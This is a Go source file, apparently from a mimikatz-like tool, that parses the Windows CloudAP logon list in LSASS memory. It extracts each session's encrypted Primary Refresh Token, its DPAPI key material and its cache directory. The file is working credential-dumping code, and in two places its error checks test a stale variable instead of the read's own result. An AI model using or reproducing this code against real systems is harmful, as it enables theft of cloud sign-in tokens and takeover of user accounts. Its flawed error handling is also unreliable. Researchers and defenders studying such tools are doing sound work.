package cloudap

import (
	"unicode/utf16"

	"github.com/vincd/savoir/modules/sekurlsa/packages/globals"
	"github.com/vincd/savoir/utils"
	"github.com/vincd/savoir/windows"
)

type CloudApEntry struct {
	AuthenticationId uint64 `json:"authentication_id"`
	KeyGuid          string `json:"key_guid"`
	CacheDir         string `json:"cache_dir"`
	EncDPApi         []byte `json:"-"`
	DPApi            []byte `json:"dpapi"`
	EncPrt           []byte `json:"-"`
	Prt              string `json:"prt"`
}

func ParseCloudAp(l utils.MemoryReader) ([]*CloudApEntry, error) {
	// This module is not supported on old Windows version.
	// TODO: handle when a module is not supported
	if l.BuildNumber() <= windows.BuildNumberWindows10_1903 {
		return make([]*CloudApEntry, 0), nil
	}

	cloudapEntry, _, err := globals.FindStructurePointerFromSignature(l, "cloudap.dll", cloudapSignatures)
	if err != nil {
		return nil, err
	}

	entries := make([]*CloudApEntry, 0)
	ptr := *cloudapEntry
	for ptr > 0 {
		entry := &KiwiCloudApLogonListEntry{}
		if err := l.ReadStructure(ptr, entry); err != nil {
			return nil, err
		}

		if entry.Link.Flink == *cloudapEntry {
			break
		}

		cloudapEntry := CloudApEntry{
			AuthenticationId: entry.LocallyUniqueIdentifier,
		}

		if entry.CacheEntry != 0 {
			cacheEntry := &KiwiCloudApCacheListEntry{}
			if l.ReadStructure(entry.CacheEntry, cacheEntry); err != nil {
				return nil, err
			}

			cloudapEntry.CacheDir = string(utf16.Decode(cacheEntry.ToName[:]))

			if cacheEntry.CbPRT > 0 && cacheEntry.PRT > 0 {
				cloudapEntry.EncPrt = make([]byte, cacheEntry.CbPRT)
				if err := l.ReadStructure(cacheEntry.PRT, cloudapEntry.EncPrt); err != nil {
					return nil, err
				}
			}

			if cacheEntry.ToDetermine != 0 {
				cacheUnk := &KiwiCloudApCacheUnk{}
				if l.ReadStructure(cacheEntry.ToDetermine, cacheUnk); err != nil {
					return nil, err
				}

				cloudapEntry.KeyGuid = cacheUnk.Guid.String()
				cloudapEntry.EncDPApi = cacheUnk.Unk[:]
			}
		}

		entries = append(entries, &cloudapEntry)
		ptr = entry.Link.Flink
	}

	return entries, nil
}
